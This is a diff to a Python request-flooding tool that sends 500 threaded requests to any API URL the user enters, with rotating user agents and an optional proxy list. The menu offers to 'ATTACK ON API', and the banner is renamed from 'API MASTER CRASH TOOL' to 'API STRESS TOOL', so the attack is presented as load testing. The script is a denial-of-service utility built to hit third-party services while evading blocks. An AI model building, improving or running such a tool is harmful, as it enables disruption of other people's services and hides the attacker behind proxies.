@@ -9,12 +9,12 @@ import webbrowser
 # 🎨 Terminal Colors
 GREEN = '\033[92m'
 RED = '\033[91m'
-GREEN = '\033[96m'
-RED = '\033[97m'
+CYAN = '\033[96m'
+WHITE = '\033[97m'
 RESET = '\033[0m'
 BOLD = '\033[1m'
 
-# ▓ User-Agents
+# 📋 User-Agents
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -23,12 +23,12 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; SM-G973F)"
 ]
 
-# ۞ Settings
+# ⏱️ Settings
 TOTAL_REQUESTS = 500
 DELAY_BETWEEN_REQUESTS = 0.01
 THREAD_COUNT = 20
 
-# 𖠅 Stats
+# 📊 Stats
 success_count = 0
 failed_count = 0
 lock = threading.Lock()
@@ -57,7 +57,7 @@ def run_stress_test(api_url, use_proxies=False, dynamic_proxies=None):
     global success_count, failed_count
     success_count = 0
     failed_count = 0
-    print(f"\n{CYAN}♋︎︎ Sending {TOTAL_REQUESTS} requests to API: {api_url}{RESET}\n")
+    print(f"\n{CYAN}♋︎ Sending {TOTAL_REQUESTS} requests to API: {api_url}{RESET}\n")
     threads = []
     for i in range(1, TOTAL_REQUESTS + 1):
         t = threading.Thread(target=send_request, args=(i, api_url, dynamic_proxies if use_proxies else None))
@@ -74,15 +74,15 @@ def run_stress_test(api_url, use_proxies=False, dynamic_proxies=None):
         t.join()
 
     print(f"\n{GREEN}✔ Done!{RESET}")
-    print(f"{RED}✔ Success: {success_count} | ✘ Failed: {failed_count}{RESET}")
+    print(f"{WHITE}✔ Success: {success_count} | ✘ Failed: {failed_count}{RESET}")
 
 def menu():
     clear()
     print(f"{GREEN}{BOLD}+{'='*35}+")
-    print(f"|{' API MASTER CRASH TOOL v1.1 ':^35}|")
+    print(f"|{' API STRESS TOOL v2.1 ':^35}|")
     print(f"+{'='*35}+{RESET}")
     print(f"{RED}╼ DEVELOPED BY THE DARK OF MASTER☠︎{RESET}\n")
-    print(f"{GREEN}> ENTER 1 TO ATTACK ON API")
+    print(f"{CYAN}> ENTER 1 TO ATTACK ON API")
     print("> ENTER 2 TO ATTACK API WITH PROXY")
     print("> ENTER 3 TO GET MORE TOOLS & JOIN US")
     print("> ENTER 4 TO EXIT TOOL{RESET}")
@@ -95,7 +95,7 @@ if __name__ == "__main__":
         if user_choice == "1":
             api_url = input(f"\n{WHITE}> 🔗 ENTER API URL: {RESET}").strip()
             run_stress_test(api_url, use_proxies=False)
-            input(f"\n{GREEN}> ♲︎ Press Enter to return to menu...{RESET}")
+            input(f"\n{CYAN}> ♲︎ Press Enter to return to menu...{RESET}")
         elif user_choice == "2":
             api_url = input(f"\n{WHITE}> 🔗 ENTER API URL: {RESET}").strip()
             print(f"{WHITE}> ♲︎ ENTER YOUR PROXY LIST (one per line)")
